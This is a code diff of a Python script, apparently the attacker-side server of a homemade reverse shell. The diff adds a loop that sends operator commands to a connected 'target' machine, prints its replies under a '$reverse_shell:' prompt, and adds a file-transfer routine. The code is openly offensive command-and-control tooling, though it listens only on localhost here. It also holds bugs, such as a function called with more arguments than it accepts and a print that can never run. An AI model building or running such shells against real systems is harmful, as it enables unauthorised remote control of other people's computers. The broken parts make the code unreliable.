@@ -1,5 +1,6 @@
 import socket
 
+BUFFER_SIZE = 1024
 attacker_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 
 # lets the attacker server listen on the specified port number
@@ -16,25 +17,57 @@ def target_client_connection_receiver():
         
         if(target_client != None):
             break
-    print("Connection established to " + str(target_client.getpeername()))
+    print("Connection established to target\n $reverse_shell: ", end="")
     return target_client
 
 
 # connects to the client being targeted
 def send_data(data, target_client):
-
     
     target_client.send(bytes(data, 'utf-8'))
+    acknowledgement =  target_client.recv(BUFFER_SIZE)
+    if(acknowledgement == b'ACK'):
+        # print("Data received at target end")
+        receive_data(target_client)
+    else:
+        print("Acknowledgement receipt not received.\n$reverse_shell: ", end = "")
 
-    response = target_client.recv(1024)
-    print(response)
 
-    if(response == b'ACK'):
-        print("Data received at target end")
+def receive_data(target_client):
+    response = ""
+    while True:
+        received_data = target_client.recv(BUFFER_SIZE)
+        received_data = received_data.decode('utf-8')
+        response = response + received_data
+        if(len(received_data) < BUFFER_SIZE):
+            break
+    print(response + "\n$reverse_shell: ", end= "")
+
+    
+def command_handler(target_client):
+    data = str(input())
+    try:
+        data.index('file')
+        file_handler(target_client, data)
+        return
+    except:
+        pass
+    send_data(data, target_client)
 
 
-def receive_data():
-    pass
+def file_handler(target_client):
+    # data_splits = 
+    print("enter FILE_UPDATE_QUIT to end data transfer")
+    while True:
+        data = str(input("--> "))
+        target_client.send(bytes(data, 'utf-8'))
+        acknowledgement =  target_client.recv(BUFFER_SIZE)
+        if(not(acknowledgement == b'ACK')):
+            # print("Data received at target end")
+            print("Acknowledgement receipt not received")
+        if(data == 'FILE_UPDATE_QUIT'):
+            break
+            print("\n$reverse_shell: ", end= "")
 
 def main():
     attacker_server_binder("localhost", 1234)
@@ -42,6 +75,7 @@ def main():
     # receive connection from target client
     target_client = target_client_connection_receiver()
 
-    send_data("ABCD", target_client)
+    while True:
+        command_handler(target_client)
 
 main()
